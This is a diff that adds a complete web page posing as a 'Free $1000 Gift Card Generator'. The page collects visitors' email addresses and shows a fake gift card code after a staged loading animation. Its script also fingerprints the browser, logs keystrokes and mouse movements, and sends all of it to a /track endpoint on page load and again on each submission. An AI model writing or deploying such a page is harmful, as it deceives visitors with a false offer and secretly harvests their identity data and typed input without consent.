@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Gift Card Generator</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXX-X"></script>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+        input, button { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        button { background: #007cba; color: white; font-size: 18px; cursor: pointer; }
+        button:hover { background: #005a87; }
+        .loading { display: none; text-align: center; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Free $1000 Gift Card Generator</h1>
+        <p>Enter your email to instantly generate your gift card code!</p>
+        <input type="email" id="email" placeholder="your.email@example.com" required>
+        <button onclick="generateCard()">Generate My Gift Card!</button>
+        <div id="loading" class="loading">Generating your gift card... <span id="dots"></span></div>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        // Comprehensive browser fingerprinting
+        function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint test', 2, 2);
+            
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                canvas: canvas.toDataURL(),
+                webgl: (function() {
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    return gl ? gl.getParameter(gl.RENDERER) + gl.getParameter(gl.VENDOR) : 'N/A';
+                })(),
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
+                fonts: (function() {
+                    const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana'];
+                    return testFonts.filter(font => document.fonts.check(`12px ${font}`)).join(',');
+                })()
+            };
+        }
+
+        // Send tracking data
+        function sendTrackingData(email) {
+            const fp = getFingerprint();
+            const trackingData = {
+                email: email,
+                ip: 'x-fetching', // Server-side
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                fingerprint: fp,
+                mouse: { x: 0, y: 0, moves: 0 },
+                keys: []
+            };
+
+            // Track mouse movement
+            document.addEventListener('mousemove', function(e) {
+                trackingData.mouse.moves++;
+                trackingData.mouse.x = e.clientX;
+                trackingData.mouse.y = e.clientY;
+            });
+
+            // Track keystrokes
+            document.addEventListener('keydown', function(e) {
+                trackingData.keys.push({
+                    key: e.key,
+                    code: e.code,
+                    time: Date.now()
+                });
+            });
+
+            // Send beacon (works even on page close)
+            navigator.sendBeacon('/track', JSON.stringify(trackingData));
+            
+            // Also send via AJAX for immediate capture
+            $.post('/track', trackingData);
+        }
+
+        function generateCard() {
+            const email = $('#email').val();
+            if (!email) return alert('Please enter your email!');
+            
+            $('#loading').show();
+            sendTrackingData(email);
+            
+            // Fake loading animation
+            let dots = '';
+            const interval = setInterval(() => {
+                dots += '.';
+                $('#dots').text(dots);
+                if (dots.length > 3) dots = '';
+            }, 300);
+
+            setTimeout(() => {
+                clearInterval(interval);
+                $('#loading').hide();
+                $('#result').html(`
+                    <h2>✅ Success!</h2>
+                    <p>Your gift card code: <strong>GC-${Math.random().toString(36).substr(2, 12).toUpperCase()}</strong></p>
+                    <p>Check your email (${email}) for details!</p>
+                `);
+                sendTrackingData(email); // Send again on completion
+            }, 3000);
+        }
+
+        // Auto-track on load
+        $(document).ready(function() {
+            sendTrackingData('unknown');
+        });
+
+        // Track page visibility changes
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                navigator.sendBeacon('/track', JSON.stringify({
+                    event: 'page_visible',
+                    timestamp: new Date().toISOString()
+                }));
+            }
+        });
+    </script>
+</body>
+</html>
